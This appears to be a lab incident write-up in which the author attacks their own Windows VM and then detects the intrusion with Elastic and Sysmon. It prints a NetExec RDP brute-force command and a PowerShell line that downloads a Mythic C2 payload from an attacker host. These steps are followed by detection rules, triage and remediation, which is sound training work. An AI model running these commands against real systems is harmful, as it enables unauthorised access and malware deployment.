
---


### summary
On october 7, at 14:30:02 an attacker with ip 172.31.0.15 bruteforced the open rdp service, disabled windows real-time protection (RTP),  downloaded a C2 payload from the ip 172.31.0.14 and executed it.
This resulted in a ticket created by an elastic alert. After detecting this, the endpoint was isolated, the system reimaged and the local credentials have been changed to prevent future abuse.

**Incident report:**
- Ticket #228094 on osTicket (created october 7 14:31:38)
- Host: windows-target (172.31.0.13)
- Attacker's assets: 172.31.0.15 (bruteforcer) and 172.31.0.14 (C2 server)
- Detected on october 7 at 14:35:00
- Status: resolved

**Timeline:**
- 14:30:02 -> Attacker gets successful RDP login after bruteforcing attack.
- 14:30:26 -> Attacker disables windows defender
- 14:30:49 -> Attacker downloads payload under the name **windows_process.exe**
- 14:32:51 -> Execution of staged payload 
- 14:32:53 -> First C2 network beacon sent to 172.31.0.14:80 

#### MITRE ATT&CK mappings
| Tactic                | Technique                           | ID        | Evidence                                                           |
| :-------------------- | :---------------------------------- | :-------- | :----------------------------------------------------------------- |
| **Initial Access**    | Brute Force: Password Guessing      | T1110.001 | NetExec RDP bruteforce. Event 4625 spike -> Event 4624             |
| **Defense Evasion**   | Impair Defenses: Disable Tools      | T1562.001 | Defender RTP disabled (Event 5001 / 5007, alerted by elastic)      |
| **Defense Evasion**   | Masquerading: Match-Legitimate Name | T1036     | windows_process.exe internal name Apollo.exe                       |
| **Execution**         | User Execution: Malicious File      | T1204.002 | Interactive execution from explorer.exe (double click on the file) |
| **Command & Control** | Application Layer Protocol: Web     | T1071.001 | Outbound TCP connection to 172.31.0.14:80                          |

---
### attack

Attack:
The attack consists of 4 steps:
1. Brute force the open rdp service
2. Disable windows defender
3. Stage and execute the C2 server payload
4. Command execution from the C2 server

#### initial access
Using NetExec, had better results than with hydra or crowbar.
assuming password is inside rdp_passwords.txt
```bash
nxc rdp 172.31.0.13 -u Administrator -p rdp_passwords.txt --log nxc_out.txt
```

#### Defense evasion + execution
log in using xfreerdp, disable defender manually and stage the C2 payload with:
```powershell
invoke-webrequest http://172.31.0.14:9999/windows_process.exe -Outfile "C:\Users\Administrator\Downloads\windows_process.exe"
```

execute the payload and wait for the agent callback on mythic
![Pasted image 20261007143330](images/Pasted%20image%2020261007143330.png)
#### Command and control
From here we will use our C2 server to send and execute commands, instead of just logging with rdp![Pasted image 20261007143457](images/Pasted%20image%2020261007143457.png)
The next steps would be running the payload on startup, gathering system info, privilege escalation, lateral movement, etc...


---


### alerts
#### defender disabling:
Rule:
```bash
winlog.provider_name : "Microsoft-Windows-Windows Defender"  and ((event.code: 5007 and message : "*Windows Defender\\Exclusions*" and winlog.event_data.New Value: *) or event.code: 5001)
```

This alerts in 2 cases:
- total rtp disabling
- file/folder exclusion ADDED
A more adept attacker could know better than to disable rtp raising alarms, and to just exclude the payload. The first part of the rule checks for that.

This results on the alert:![Pasted image 20261007152442](images/Pasted%20image%2020261007152442.png)
On the actions tab of the alert we want to configure it so it creates a ticket on osTicket, alerting us.
```JSON
{
  "name": "Elastic SIEM",
  "email": "alerts@example.com",
  "subject": "{{context.rule.name}} on {{context.alerts.0.host.name}}",
  "message": "data:text/html,<h3>Security Alert</h3><br><b>Rule:</b> {{context.rule.name}}<br><b>Host:</b> {{context.alerts.0.host.name}}<br><b>Time:</b> {{date}}<br><br>defender has been deactivated, or an exclusion has been added. Investigate possible malware download/execution following this.",
  "autorespond": false,
  "alert": false
}
```


Ticket #228094![Pasted image 20261007161144](images/Pasted%20image%2020261007161144.png)Discrepancy between time on the alert and on the body happens because the target is using UTC, and other assets use local time (UTC-3).


### Investigation and triage
Received ticket #228094 on osTicket, created by alert 
`DEFENDER_DISABLED_OR_EXCLUSION_ADDED` on the host `windows-target` (172.31.0.13).

Access correlation:
Look for successful rdp logins before this disabling.
```sh
agent.name : "windows-target" and event.code: 4624 and source.ip : *
```
(last part just for highlighting)


**login**
apparently there was a login at 14:30:02 from the source_ip: 172.31.0.15, which we know is the attackers ip.
`agent.name : "windows-target" and event.code: 4624 and winlog.logon.id : * and source.ip : "172.31.0.15" `
![Pasted image 20261007152819](images/Pasted%20image%2020261007152819.png)
This also has LogonType 10, which means they logged through rdp.

Also, before that there are dozens of 4625s (failed logins)
`agent.name : "windows-target" and event.code: 4625 and winlog.logon.id : * and source.ip : "172.31.0.15" `
![Pasted image 20261007155707](images/Pasted%20image%2020261007155707.png)

**defender rtp disabling**
![Pasted image 20261007160850](images/Pasted%20image%2020261007160850.png)
in this case it was a total rtp disabling indicated by event code 5001.

**payload staging:**
Looking for the payload download we see at 14:30:49:
`winlog.event_id: 11 and "windows_process.exe"`
```JSON
"computer_name": "windows-target",
"event_data": {
	"CreationUtcTime": "2026-10-07 17:30:49.057","Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
	"ProcessGuid": "{602CA8A3-81B6-6AC6-FD01-000000002200}",
	"ProcessId": "6460",
	"RuleName": "-",
	"TargetFilename": "C:\\Users\\Administrator\\Downloads\\windows_process.exe",
	"User": "WINDOWS-TARGET\\Administrator",
```
With event.id: 11 (file created). This is the time that the payload was staged by the attacker.

**payload execution**
At 14:32:51 we see this:
`event.code: 1 and *windows_process.exe*`
```JSON

"event_data": {
	"CommandLine": "\"C:\\Users\\Administrator\\Downloads\\windows_process.exe\" ",
	"Company": "-",
	"CurrentDirectory": "C:\\Users\\Administrator\\Downloads\\",
	"Description": "Apollo",
	"FileVersion": "1.0.0.0",
	"Hashes": "SHA1=C654786DEA758A20DBD5FFE5FEC8C58353D529D6,MD5=A3F6DC477AA477BE2017A79ACC73BBBC,SHA256=FB086B05C6C585DD09DF017EA155BC1D8AE26F0297EFA85DAE5910A375763AC8,IMPHASH=F34D5F2D4577ED6D9CEEC516C1F5A744",
	"Image": "C:\\Users\\Administrator\\Downloads\\windows_process.exe",
	"IntegrityLevel": "High",
	"LogonGuid": "{602CA8A3-5B15-6AC6-3FDB-390000000000}",
	"LogonId": "0x39db3f",
	"OriginalFileName": "Apollo.exe",
	"ParentCommandLine": "C:\\Windows\\Explorer.EXE",
	"ParentImage": "C:\\Windows\\explorer.exe",
	"ParentProcessGuid": "{602CA8A3-5B16-6AC6-FD00-000000002200}",
	"ParentProcessId": "4600",
	"ParentUser": "WINDOWS-TARGET\\Administrator",
	"ProcessGuid": "{602CA8A3-8243-6AC6-0302-000000002200}",
	"ProcessId": "4412",
	"Product": "Apollo",
	"RuleName": "technique_id=T1204,technique_name=User Execution",
	"TerminalSessionId": "1",
	"User": "WINDOWS-TARGET\\Administrator"
	}
}
```
This is a process creation, some important fields are:
- `"Image": "C:\\Users\\Administrator\\Downloads\\windows_process.exe"`
- `"OriginalFileName": "Apollo.exe"`
- `"ProcessId": "4412"`
- `"Hashes": "SHA1=C654786DEA758A20DBD5FFE5FEC8C58353D529D6,MD5=A3F6DC477AA477BE2017A79ACC73BBBC,SHA256=FB086B05C6C585DD09DF017EA155BC1D8AE26F0297EFA85DAE5910A375763AC8,IMPHASH=F34D5F2D4577ED6D9CEEC516C1F5A744",`
- `"LogonId": "0x39db3f"`

It appears that the user executed the file windows_process.exe, and its original name was Apollo.exe. This tips us that the file is actually the mythic C2 agent apollo.
ProcessId, hashes, and logonId could be used for later investigation.


**C2 beaconing**
Looking for event.code: 3 (network connection) right after this execution we see:
![Pasted image 20261007153458](images/Pasted%20image%2020261007153458.png)
```JSON
"event_data": {
    "DestinationHostname": "-",
    "DestinationIp": "172.31.0.14",
    "DestinationIsIpv6": "false",
    "DestinationPort": "80",
    "DestinationPortName": "-",
    "Image": "C:\\Users\\Administrator\\Downloads\\windows_process.exe",
    "Initiated": "true",
    "ProcessGuid": "{602CA8A3-8243-6AC6-0302-000000002200}",
    "ProcessId": "4412",
    "Protocol": "tcp",
    "RuleName": "technique_id=T1036,technique_name=Masquerading",
    "SourceHostname": "-",
    "SourceIp": "172.31.0.13",
    "SourceIsIpv6": "false",
    "SourcePort": "51063"
}
```
This is a tcp connection from 172.31.0.13:51063 (our ip) to 172.31.0.14:80 by file windows_process.exe, and with PID 4412, like we checked before. 

### remediation

Isolated the host 172.31.0.13 from the network. Restored the system to a base image, and changed local credentials.

For hardening the system against future attacks:
- Implement network level authentication on RDP
- Create an account lockout policy
- Restrict RDP to certain known ips / behind a vpn, or close if not used.

Also took note of the attacker's ips for further investigation/reporting:
172.31.0.15 (rdp bruteforcer)
172.31.0.14 (C2 server)

----

